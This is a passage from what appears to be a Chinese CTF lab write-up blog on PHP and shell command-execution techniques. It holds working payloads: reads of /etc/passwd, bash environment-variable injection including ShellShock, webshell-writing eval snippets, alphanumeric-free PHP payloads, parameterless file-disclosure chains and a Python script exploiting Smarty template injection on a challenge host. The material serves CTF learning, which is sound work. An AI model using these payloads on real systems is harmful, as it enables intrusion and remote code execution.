class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p>此时文件按字典序排序为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">g\&gt;</span><br><span class="line">ht-</span><br><span class="line">sl</span><br></pre></td></tr></table></figure><p>使用 <code>*&gt;v</code> 相当于执行 <code>dir g&gt; ht- sl &gt; v</code></p><p>即将这三个文件的名字写入 v 中</p><p><img src="/image-3.png" alt="alt text"></p><p>使用 <code>&gt;rev</code></p><p>创建名为 rev 的空文件</p><p><code>*v&gt;x</code></p><p>同时匹配文件 v 和 rev，执行命令 rev v&gt;x</p><p>于是 x 中的内容</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -th &gt; g</span><br></pre></td></tr></table></figure><p>将 rev 写入</p><h4 id="lab17-PHP-命令执行函数"><a href="#lab17-PHP-命令执行函数" class="headerlink" title="lab17-PHP 命令执行函数"></a>lab17-PHP 命令执行函数</h4><ul><li><p><code>system()</code> 函数用于在系统权限允许的情况下执行系统命令（Windows 和 Linux 系统均可执行）。<br>例：<code>system(&#39;cat /etc/passwd&#39;);</code></p></li><li><p><code>exec()</code> 函数可以执行系统命令，<strong>但不会直接输出结果</strong>，而是将结果保存到数组中。<br>例：<code>exec(&#39;cat /etc/passwd&#39;, $result); print_r($result);</code></p></li><li><p><code>shell_exec()</code> 函数执行系统命令，但返回一个字符串类型的变量来存储系统命令的执行结果。<br>例：<code>echo shell_exec(&#39;cat /etc/passwd&#39;);</code></p></li><li><p><code>passthru()</code> 函数执行系统命令并将执行结果输出到页面中，支持二进制数据。<br>例：<code>passthru(&#39;cat /etc/passwd&#39;);</code></p></li><li><p><code>popen()</code> 函数执行系统命令，但返回一个资源类型的变量，需要配合 <code>fread()</code> 函数读取结果。<br>例：<code>$result = popen(&#39;cat /etc/passwd&#39;, &#39;r&#39;); echo fread($result, 100);</code></p></li><li><p>反引号用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。<br>例：<code>echo `cat /etc/passwd`;</code></p></li></ul><h4 id="lab18-环境变量注入"><a href="#lab18-环境变量注入" class="headerlink" title="lab18-环境变量注入"></a>lab18-环境变量注入</h4><p>见文章<a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">环境变量注入</a></p><p>文章重点</p><p>我可以控制执行 sh -c “echo hello”时的环境变量，是否可以 getshell？</p><p>sh -c “echo hello”虽然是一条命令，但是实际上它执行了两个二进制文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh</span><br><span class="line"><span class="built_in">echo</span></span><br></pre></td></tr></table></figure><p>其中，sh 通常只是一个软连接，并不是真的有一个 shell 叫 sh。在 debian 系操作系统中，sh 指向 dash；在 centos 系操作系统中，sh 指向 bash。</p><ol><li>如果 sh 指向 dash, 且传入了 -i 参数，那么使用 <code>ENV=&#39;$(id 1&gt;&amp;2)&#39; dash -i -c &#39;echo hello&#39;</code> 可以实现环境变量注入。</li><li>如果 sh 指向 bash,且 bash 的版本大于等于 4.4（centos 8），那么 bash 会将满足特定条件的环境变量变成一个函数，所以使用 <code>env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code> 可以实现环境变量注入。</li><li>如果 sh 指向 bash,且 bash 的版本小于 4.4（centos 7），那么 bash 也将满足特定条件的环境变量变成一个函数，只不过略微不同，所以使用 <code>env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code> 可以实现环境变量注入。</li></ol><p>总结</p><ul><li>Bash 没有修复 ShellShock 漏洞：直接使用 ShellShock 的 POC 进行测试，例如 TEST&#x3D;() { :; }; id;</li><li>Bash 4.4 以前：env $’BASH_FUNC_echo()&#x3D;() { id; }’ bash -c “echo hello”</li><li>Bash 4.4 及以上：env $’BASH_FUNC_echo%%&#x3D;() { id; }’ bash -c ‘echo hello’</li><li>BASH_ENV：可以在 bash -c 的时候注入任意命令</li><li>ENV：可以在 sh -i -c 的时候注入任意命令</li><li>PS1：可以在 sh 或 bash 交互式环境下执行任意命令</li><li>PROMPT_COMMAND：可以在 bash 交互式环境下执行任意命令</li></ul><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br></pre></td></tr></table></figure><p>wp</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">envs%5BBASH_FUNC_echo%25%25%5D=%28%29%20%7B%20cat%20%2Fflag%3B%20%7D</span><br></pre></td></tr></table></figure><h4 id="lab19-文件写入"><a href="#lab19-文件写入" class="headerlink" title="lab19-文件写入"></a>lab19-文件写入</h4><table><thead><tr><th>函数</th><th>说明</th><th>示例代码</th></tr></thead><tbody><tr><td><code>file_put_contents</code></td><td>将字符串写入文件,如果文件不存在会尝试创建。适用于快速简单地写入数据到文件。</td><td><code>file_put_contents(&#39;example.php&#39;, &#39;&lt;?php eval($_GET[helloctf]); ?&gt;&#39;);</code></td></tr><tr><td><code>fwrite/fputs</code></td><td>向一个打开的文件流写入数据,适用于需要更细粒度的控制文件操作的场景。</td><td><code>$fp = fopen(&#39;example.php&#39;, &#39;w&#39;); fwrite($fp, &#39;&lt;?php eval($_GET[helloctf]); ?&gt;&#39;); fclose($fp);</code></td></tr><tr><td><code>fprintf</code></td><td>类似于 <code>fwrite</code>,但提供格式化功能,允许按照特定格式写入数据到文件流。适用于需要格式化写入的场景。</td><td><code>$fp = fopen(&#39;example.php&#39;, &#39;w&#39;); fprintf($fp, &#39;&lt;?php eval($_GET[helloctf]); ?&gt;&#39;); fclose($fp);</code></td></tr></tbody></table><p>通过将恶意代码写入到服务器上的 PHP 文件中，并通过浏览器访问该文件，可以实现远程代码执行。</p><h4 id="lab20-文件包含"><a href="#lab20-文件包含" class="headerlink" title="lab20-文件包含"></a>lab20-文件包含</h4><p>同上</p><h4 id="lab21-文件远程包含"><a href="#lab21-文件远程包含" class="headerlink" title="lab21-文件远程包含"></a>lab21-文件远程包含</h4><p>同上</p><h4 id="lab22-PHP-特性-动态调用"><a href="#lab22-PHP-特性-动态调用" class="headerlink" title="lab22-PHP 特性-动态调用"></a>lab22-PHP 特性-动态调用</h4><p>PHP 支持在运行时动态构建并且调用函数，在下面的代码中 <code>a</code> 可以被作为函数，<code>b</code> 可以被作为函数的参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=system&amp;b=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><h4 id="lab23-PHP-特性-自增"><a href="#lab23-PHP-特性-自增" class="headerlink" title="lab23-PHP 特性-自增"></a>lab23-PHP 特性-自增</h4><p>可用字符：<code>! $ &#39; ( ) + , . / ; = [ ] _</code></p><p>自增通过以下几个特性实现：</p><p><strong>变量：</strong></p><p>在 PHP 中变量以 <code>$</code> 开头，后面为变量名称，PHP 中变量可以是下划线 <code>_</code> 开头，所以 <code>$_</code> 是一个变量，<code>$__</code> 则是不同的变量，就像 <code>$a</code> 和 <code>$aa</code> 一样。</p><p><strong>数组-&gt;字符串：</strong></p><p>在 PHP 中，非字符串是不能使用 <code>.</code> 符号进行拼接的，当你强制拼接时 PHP 会将非字符串转换为字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>.<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这将会输出：<code>int(1) string(1) &quot;1&quot;</code></p><p>但如果 <code>$_</code> 是一个数组，则会被强制转换为字符串 <code>Array</code> 而无视数组内容。</p><p>所以 <code>[].&#39;&#39;</code> 表示在空数组后面拼接空字符串，PHP 会优先转换类型,从而将数组转换为字符串 <code>Array</code>。</p><p><strong>字符串：</strong></p><p>字符串本质上是一个字符的有序序列，同 C 语言类似，你可以直接通过索引（或者说下标）的方式直接访问字符串中的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&quot;Hello-CTF&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>这将会输出 <code>string(1) &quot;H&quot;</code></p><p>所以在 <code>$_ = ([].&#39;&#39;)[0]; var_dump($_);</code> 你会得到输出：<code>string(1) &quot;A&quot;</code></p><p><strong>自增：</strong></p><p>这是一个编程语言中很常见的操作，我们一般在 for 循环会写到的语句 <code>i++</code> 或者 <code>++i</code>，这是一个自增操作，PHP 也一样，只不过我们的变量名称不是很常见与之等效的 <code>$_++</code> 或者 <code>++$_</code>。</p><p>当我们对一个字符或者是字母进行自增操作时，PHP 会将其转换为 ASCII 码，然后自增，然后再转换为字符。直观一点 <code>A++</code> 将会输出 <code>B</code>，<code>Z++</code> 将会输出 <code>AA</code>。<code>++</code> 的位置决定语句的执行顺序，<code>++</code> 在前面时会先进行自增操作。<code>$_ = ([].&#39;&#39;)[0];</code> 在前面时输出 <code>B</code>，后面时输出 <code>A</code>。</p><p>所以通过特性的连用，你可以看到很多自增的 Payload 长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$__</span>.<span class="variable">$_</span>++.<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span> =<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$$__</span>[__](<span class="variable">$$__</span>[_]);</span><br><span class="line">&amp;__=system</span><br><span class="line">&amp;_=ls</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your Payload&#x27;s Length : &quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要 urlencode post 内容</p><h4 id="lab24-PHP-特性-无参命令执行"><a href="#lab24-PHP-特性-无参命令执行" class="headerlink" title="lab24-PHP 特性-无参命令执行"></a>lab24-PHP 特性-无参命令执行</h4><p>传 <code>get</code> 参数记得将<code>;</code>转换为<code>%3B</code></p><p>根据正则表达式的匹配规则,可以看到我们只能输入 <code>A()</code> 这样的形式,括号中无法携带参数,但支持多个函数嵌套 <code>A(B(C()))</code> 这种形式,我们称其为无参命令执行。</p><p>无参命令执行的难度首先是在于无参本身,这需要你利用一些函数特性外带参数绕过限制——这可以从一些获取外部值的函数实现:</p><ul><li><code>getallheaders()</code> - 获取所有 HTTP 请求头</li><li><code>session_id()</code> - 获取&#x2F;设置会话 ID</li><li>…</li></ul><p>其次是对嵌套参数的处理——当然不局限于外带进来的参数,一些诸如 <code>localeconv()</code> 的函数可以获取内部存在的一些参数如当前目录下面的文件信息等:</p><ul><li><p><code>localeconv()</code> - 获取本地化信息</p></li><li><p><code>getcwd()</code> - 函数返回当前工作目录</p></li><li><p><code>scandir()</code> - 函数返回指定目录中的文件和目录的数组</p></li><li><p><code>dirname()</code> - 函数返回路径中的目录部分</p></li><li><p><code>chdir()</code> - 函数改变当前的目录</p></li></ul><p>通常我们获取到的很多情况下是数组,所以有时候比较依赖对数组的操作,比如:</p><ul><li><code>array_reverse()</code> - 数组反转</li><li><code>pos()</code> - 输出数组第一个元素</li><li><code>next()</code> - 指向数组的下一个元素,并输出</li><li><code>current()</code> - 返回数组中的当前元素</li><li><code>scandir()</code> - 返回指定目录中的文件和目录的数组</li><li><code>var_dump()</code> - 输出一个或多个表达式的结构信息</li></ul><p>随后是一些文件读取显示的操作:</p><ul><li><code>show_source()</code> - 对文件进行语法高亮显示</li><li><code>readfile()</code> - 输出一个文件</li><li><code>highlight_file()</code> - 对文件进行语法高亮显示</li><li><code>file_get_contents()</code> - 把整个文件读入一个字符串中</li><li><code>readgzfile()</code> - 可用于读取非 gzip 格式的文件</li></ul><h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><h6 id="code-var-dump-scandir-current-localeconv"><a href="#code-var-dump-scandir-current-localeconv" class="headerlink" title="?code&#x3D;var_dump(scandir(current(localeconv())));"></a>?code&#x3D;var_dump(scandir(current(localeconv())));</h6><ol><li><code>localeconv()</code><br>返回一个关于“当前区域设置（locale）”的数字格式信息数组，比如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  <span class="string">&quot;decimal_point&quot;</span> =&gt; <span class="string">&quot;.&quot;</span>,</span><br><span class="line">  <span class="string">&quot;thousands_sep&quot;</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;int_curr_symbol&quot;</span> =&gt; <span class="string">&quot;USD&quot;</span>,</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里关键是第一个元素的值通常是小数点 <code>&quot;.&quot;</code>（在默认 <code>C</code>&#x2F;<code>en_US</code> 等 locale 下）。</p><ol start="2"><li><p><code>current(localeconv())</code><br><code>current()</code> 取数组的“当前指针”所指元素的<strong>值</strong>。由于 <code>localeconv()</code> 返回数组的第一个键就是 <code>decimal_point</code>，它的值一般是 <code>&quot;.&quot;</code>，所以这一步得到的就是不带引号写出来的点号字符串（在语义上等同于 <code>&quot;.&quot;</code>，但你在 payload 里不需要自己写引号）。</p></li><li><p><code>scandir(current(localeconv()))</code><br>等价于 <code>scandir(&quot;.&quot;)</code>，即列出<strong>当前工作目录</strong>内容。<code>scandir</code> 返回一个数组，例如：<code>[&quot;.&quot;, &quot;..&quot;, &quot;index.php&quot;, &quot;upload&quot;, ...]</code>。</p></li><li><p><code>var_dump(...)</code><br>把上面得到的数组原样打印（含类型与长度），方便在页面上直接看目录列表。</p></li></ol><p>因此，这个 payload 的效果就是：<strong>在不写引号与字面量 <code>&#39;.&#39;</code> 的前提下，列目录</strong>。</p><h6 id="code-show-source-array-rand-array-flip-scandir-current-localeconv"><a href="#code-show-source-array-rand-array-flip-scandir-current-localeconv" class="headerlink" title="?code&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));"></a>?code&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));</h6><ol><li><p><code>scandir(current(localeconv()))</code><br><code>localeconv()</code> 给出本地化数字格式数组；<code>current(...)</code> 取到第一个值，通常是小数点 <code>&quot;.&quot;</code>。于是这整个等价于 <code>scandir(&quot;.&quot;)</code>，列出<strong>当前工作目录</strong>里的条目（含 <code>.</code> 和 <code>..</code>）。</p></li><li><p><code>array_flip(...)</code><br>把<strong>文件名</strong>数组翻转成“<code>文件名 =&gt; 索引</code>”。这样每个<strong>文件名</strong>就变成了数组的<strong>键</strong>。</p></li><li><p><code>array_rand(...)</code><br>从“被翻转后的数组”的<strong>键集合</strong>里随机挑一个键返回。由于键就是<strong>文件名</strong>，这一步直接得到<strong>随机文件名字符串</strong>（而不是数字索引），省掉了再去 <code>[$idx]</code> 的一步。</p></li><li><p><code>show_source(...)</code><br><code>show_source</code>（&#x3D; <code>highlight_file</code> 的别名）会<strong>读取并高亮输出</strong>给定路径的文件内容：</p></li></ol><ul><li>如果文件里有 <code>&lt;?php ... ?&gt;</code>，会把 PHP 语法高亮后输出。</li><li>没 PHP 标签也会原样输出（文本文件可直接泄露；二进制会打出“花乱码”）。</li><li>传入目录（比如 <code>.</code> 或 <code>..</code>）会报 Warning 并返回 <code>false</code>。</li></ul><p>综上，这个 payload 的目的就是：<strong>在不直接写点号、不写引号的前提下，随机选取当前目录中的某个条目并把其内容作为源码打印出来</strong>。在很多 CTF&#x2F;WAF 题里，这能直接泄露 <code>index.php</code>、<code>config.php</code>、备份文件、隐藏脚本等。</p><h4 id="lab25-PHP-特性-取反"><a href="#lab25-PHP-特性-取反" class="headerlink" title="lab25-PHP 特性-取反"></a>lab25-PHP 特性-取反</h4><p>先执行 get_flag.php 才能得到 flag 文件</p><h4 id="lab26-PHP-特性-无字母数字的代码执行"><a href="#lab26-PHP-特性-无字母数字的代码执行" class="headerlink" title="lab26-PHP 特性-无字母数字的代码执行"></a>lab26-PHP 特性-无字母数字的代码执行</h4><p>推荐博客<a href="https://xz.aliyun.com/news/7702">https://xz.aliyun.com/news/7702</a></p><h4 id="lab27-PHP-特性-模板注入导致的-RCE"><a href="#lab27-PHP-特性-模板注入导致的-RCE" class="headerlink" title="lab27-PHP 特性-模板注入导致的 RCE"></a>lab27-PHP 特性-模板注入导致的 RCE</h4><p><a href="https://blog.hamayanhamayan.com/entry/2024/08/20/092636">blog1</a><br><a href="https://zenn.dev/tchen/articles/83f26ca77948fa">blog2</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Smarty</span>\<span class="title">Smarty</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">gettype</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file_path</span> = <span class="string">&quot;file://&quot;</span> . <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/pages/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$file_path</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?page=home&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该站点存在一个简单的目录遍历漏洞，但 php 的 open_basedir 设置阻止其读取 &#x2F;app 目录下的文件以外的文件。</p><p>运用了 Smart 的如下几个特性</p><ul><li>当使用 Smarty 加载文件时，会在目录 &#x2F;app&#x2F;template_c 中生成一个缓存，缓存的文件名称是通过一定规则根据源文件名称生成，是将模板编译后的 PHP 文件。</li><li>像 A&#x2F;X&#x2F;..&#x2F;B 这样的路径将被缩写为 A&#x2F;B ，但它不会检查名为 X 的目录是否存在 。因此，您可以在目录名称中嵌入代码，并在其后添加 ..&#x2F; 以防止加载该目录。</li><li>Smarty 在进行路径解析时存在 SSTI 漏洞，允许在路径中嵌入 PHP 代码并执行。</li><li>但 Smarty 会直接将 system 过滤，但不会过滤隐式的函数调用</li></ul><p>wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">URL = <span class="string">&quot;http://80-9e7fe323-063b-4659-9d1a-a4e4f4800531.challenge.ctfplus.cn/&quot;</span></span><br><span class="line"><span class="comment"># URL = &quot;http://localhost:1337/&quot;</span></span><br><span class="line">cwd = <span class="string">&#x27;/app&#x27;</span></span><br><span class="line"></span><br><span class="line">target_file = <span class="string">&#x27;../&#123;Closure::fromCallable(system)-&gt;__invoke(&quot;cat /flag-*&quot;)&#125;/../../pages/about&#x27;</span></span><br><span class="line">w1 = requests.get(URL + <span class="string">&quot;?page=&quot;</span> +quote(target_file))</span><br><span class="line"><span class="built_in">print</span>(w1.status_code)</span><br><span class="line"><span class="built_in">print</span>(w1.text)</span><br><span class="line"><span class="comment"># 计算模板缓存文件路径</span></span><br><span class="line">filehash = hashlib.sha1(<span class="string">f&quot;//<span class="subst">&#123;cwd&#125;</span>/pages/<span class="subst">&#123;target_file&#125;</span><span class="subst">&#123;cwd&#125;</span>/templates/&quot;</span>.encode())</span><br><span class="line">template_c_file = filehash.hexdigest() + <span class="string">&quot;_0.file_&quot;</span> + target_file.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>] + <span class="string">&quot;.php&quot;</span></span><br><span class="line">template_c_file_path = <span class="string">&quot;../templates_c/&quot;</span> + template_c_file</span><br><span class="line"></span><br><span class="line">w2 = requests.get(URL + <span class="string">&quot;?page=&quot;</span> + template_c_file_path)</span><br><span class="line"><span class="built_in">print</span>(w2.status_code)</span><br><span class="line"><span class="built_in">print</span>(w2.text)</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>git 泄露</p><p>审计 index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用无参命令执行，构造同上；</p><h3 id="NSSCTF-SWPUCTF-2021-新生赛-hardrce"><a href="#NSSCTF-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="NSSCTF[SWPUCTF 2021 新生赛]hardrce"></a>NSSCTF[SWPUCTF 2021 新生赛]hardrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span 